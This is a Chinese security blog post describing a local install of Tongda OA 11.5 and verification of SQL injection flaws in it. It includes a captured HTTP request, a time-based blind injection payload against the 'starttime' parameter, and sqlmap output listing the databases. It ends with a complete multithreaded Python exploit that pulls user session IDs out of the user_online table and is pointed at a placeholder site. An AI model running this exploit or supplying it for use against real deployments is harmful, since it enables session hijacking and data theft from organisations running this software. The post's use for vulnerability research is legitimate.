---
title: 通达OA搭建验证0day
tags:
  - 通达oa
categories:
  - 安全
copyright: true
permalink: 通达OA搭建验证0day
top: 0
password: 
abstract: 输入密码继续阅读.
message: 欢迎来到我的博客，输入密码继续阅读.
date: 2020-09-03 21:09:05
---
## 一、环境搭建：

安装11.5版本，官网最新的是11.7版本，从网上找到一个11.5的安装包，直接一键安装成功。
默认账户`admin`，密码 为空
登录后，搜索用户，创建一个普通用户，添加用户的信息。然后使用用户登录，创建会议，admin去审核通过。

<!--more-->
## 二、验证漏洞

### 1. sql注入

进入到普通用户的界面，然后打开日历。看到日历中心。然后抓包。

```
POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
Host: 192.168.199.208
Content-Length: 69
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.199.208
Referer: http://192.168.199.208/general/calendarArrange/calendarArrange.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: USER_NAME_COOKIE=%D5%C5%C8%FD; OA_USER_ID=65; PHPSESSID=ojkcbpc7ogtemglvmo48tva5s6; SID_65=bc936732
Connection: close

view=month&starttime=1595779200&endtime=1599408000&callback=undefined
```
注入点在`starttime`，该漏洞属于bool盲注。

发送到sqlmap跑注入点、数据库类型、数据库名称、数据库表、数据内容。


```
view=month&starttime=1595779200') AND (SELECT 6129 FROM (SELECT(SLEEP(5)))lWYm) AND ('nXWx'='nXWx&endtime=1599408000&callback=undefined
```
```
sqlmap identified the following injection point(s) with a total of 445 HTTP(s) requests:
---
Parameter: starttime (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=month&starttime=1595779200') AND (SELECT 6129 FROM (SELECT(SLEEP(5)))lWYm) AND ('nXWx'='nXWx&endtime=1599408000&callback=undefined
---
[12:01:43] [INFO] the back-end DBMS is MySQL
[12:01:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
back-end DBMS: MySQL >= 5.0.12
[12:01:44] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 4 times
[12:01:44] [INFO] fetched data logged to text files under 'C:\Users\YQ5\AppData\Local\sqlmap\output\192.168.199.208'
[12:01:44] [WARNING] you haven't updated sqlmap for more than 72 days!!!

[*] ending @ 12:01:44 /2020-08-23/

```

```
available databases [8]:
[*] BUS
[*] crscell
[*] information_schema
[*] mysql
[*] performance_schema
[*] TD_APP
[*] TD_OA
[*] TD_OA_ARCHIVE
```
```
-D BUS -T  post_tel -columns
post_tel
Database: BUS
[1 table]
+----------+
| post_tel |
+----------+
```
这个过程超级慢，安恒公众号发了[一篇文章](https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652482100&idx=1&sn=5be459642914e9427383448784545ea4&chksm=f2580987c52f8091517377246d1b101c70ab7b184e11b17a3b63b686667786d7e55a1b0a14f0&scene=126&sessionid=1598170249&key=a1d17b2e5fa7909239de32923ccc4e)使用多线程跑数据。

```
import requests

import _thread

import time

requests.packages.urllib3.disable_warnings()



UNAME_length = 26

USERUID = []



header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36',"Content-Type":"application/x-www-form-urlencoded",'Connection':'close'}

proxies = {'http': '127.0.0.1:8080','https': '127.0.0.1:8080'}



def get_url(url,num,uid):

    global UNAME_length

    global USERUID



    litgh = 48

    right = 120

    tmp = 0

    while litgh <= right:

        mid = int((litgh+right)/2)

        if tmp == mid:

            break

        else: tmp = mid

        flag = run_payload(url,uid,num,mid)

        if flag:

            litgh = mid

        else:

            right = mid

    USERUID[num-1] = chr(mid)

    print("session: ",num,chr(mid))



def run_payload(url,uid,num,mid):

    try:

        payload =f"""title)values("'"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/{uid},1),{num},1))>%3d{mid},1,710)))# =1&_SERVER="""

        req = requests.post(url, headers=header, proxies=proxies,data=payload,verify=False,timeout=20,allow_redirects=False)

        if req.status_code == 302:

            return True

        elif req.status_code == 500:

            return False

        elif req.status_code != 500:

            return run_payload(url,uid,num,mid)

    except Exception as e:

        return run_payload(url,uid,num,mid)



def get_uname(url,uid):

    USERUID.clear()

    [USERUID.append("") for one in range(0,UNAME_length)]

    for num in range(1,UNAME_length+1):

        _thread.start_new_thread(get_url, (url,num,uid,)) # 多线程



    tmp = 0

    while 1: # 等待跑完26位session id



        flag = 0

        for num in range(0,len(USERUID)):

            if USERUID[num] != '':

                flag += 1

        uname = ""

        for num in range(0,len(USERUID)):

            uname += str(USERUID[num])

        if flag != tmp:

            print(f"已完成: {flag}/{UNAME_length}  SID:{uname}  {USERUID} ")



        tmp = flag

        if flag == UNAME_length:

            break

    time.sleep(0.5)

    return uname



def main(url):

    url += "/general/document/index.php/recv/register/insert"

    print(url)

    uid=1 # 获取第几个用户的session

    uname = get_uname(url,uid-1)

    print("UNAME = ",uname)



url="http://www.xxx.com/"

main(url)
```